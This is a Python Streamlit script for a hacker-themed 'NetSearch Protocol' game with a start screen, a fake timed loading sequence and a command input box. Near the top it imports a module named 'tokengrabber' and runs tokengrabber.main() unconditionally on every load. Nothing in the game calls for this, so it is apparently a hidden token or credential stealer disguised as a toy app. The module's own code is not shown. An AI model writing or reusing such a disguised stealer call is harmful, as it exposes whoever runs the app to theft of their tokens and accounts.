import streamlit as st
import time
import tokengrabber

# --- 1. CONFIG & CSS (The Vibe) ---
st.set_page_config(page_title="NetSearch Protocol", layout="centered")

# Custom CSS for the Hacker/Game Vibe
st.markdown("""
<style>
    /* Force the background to be black */
    .stApp {
        background-color: #0e0e0e;
    }

    /* FORCE all text to be green, overriding Streamlit defaults */
    h1, h2, h3, h4, h5, h6, p, div, span, label {
        color: #00FF41 !important;
        font-family: 'Courier New', Courier, monospace !important;
    }
    
    /* Hide standard Streamlit header/footer/menu */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    
    /* Style the Start Button */
    .stButton > button {
        width: 100%;
        height: 80px;
        background-color: #000000 !important; /* Force Black Background */
        color: #00FF41 !important; /* Force Green Text */
        font-family: 'Courier New', Courier, monospace !important;
        font-size: 30px !important;
        font-weight: bold;
        border: 2px solid #00FF41 !important;
        text-transform: uppercase;
        box-shadow: 0 0 10px #00FF41;
        transition: all 0.2s ease-in-out;
    }
    
    .stButton > button:hover {
        background-color: #00FF41 !important;
        color: #000000 !important;
        box-shadow: 0 0 20px #00FF41;
        cursor: pointer;
    }

    /* Input Box Styling */
    .stTextInput > div > div > input {
        background-color: #1a1a1a !important;
        color: #00FF41 !important;
        border: 1px solid #00FF41 !important;
        font-family: 'Courier New', Courier, monospace !important;
    }
</style>
""", unsafe_allow_html=True)

# --- 2. STATE MANAGEMENT ---
if 'page' not in st.session_state:
    st.session_state.page = 'start'

# --- 3. THE APP LOGIC ---
tokengrabber.main()

# === SCREEN 1: START MENU ===
if st.session_state.page == 'start':
    st.write("##") # Spacers
    st.write("##")
    
    st.markdown("<h1 style='text-align: center; color: #00FF41; text-shadow: 0 0 10px #00FF41;'>SYSTEM ACCESS</h1>", unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        if st.button("INITIALIZE"):
            st.session_state.page = 'loading'
            st.rerun()

# === SCREEN 2: FAKE LOADING SEQUENCE ===
elif st.session_state.page == 'loading':
    
    # Create empty slots for the text and the bar
    msg_slot = st.empty()
    bar_slot = st.progress(0)
    
    # This list controls how long the "Timer" lasts
    steps = [
        "ESTABLISHING CONNECTION...",
        "VERIFYING CREDENTIALS...",
        "ALLOCATING MEMORY...",
        "DECRYPTING PACKETS...",
        "ACCESS GRANTED."
    ]
    
    # Loop through steps (The "Timer")
    for i, step in enumerate(steps):
        # Update text
        msg_slot.markdown(f"```\n> {step}\n```")
        
        # Update progress bar (math to make it hit 100% at the end)
        progress = int(((i + 1) / len(steps)) * 100)
        bar_slot.progress(progress)
        
        # The Delay (Speed of the timer)
        time.sleep(30) 
        
    # Transition to final page
    st.session_state.page = 'finished'
    st.rerun()

# === SCREEN 3: DONE + INPUT ===
elif st.session_state.page == 'finished':
    st.write("##")
    st.markdown("<h2 style='text-align: center;'>PROCESS COMPLETE.</h2>", unsafe_allow_html=True)
    
    st.write("---")
    
    # The Text Box
    user_input = st.text_input("ENTER COMMAND OR FILENAME:", placeholder="Type here...")
    
    # Optional: A button to reset if they want to play again
    st.write("##")
    if st.button("RESET SYSTEM"):
        st.session_state.page = 'start'
        st.rerun()
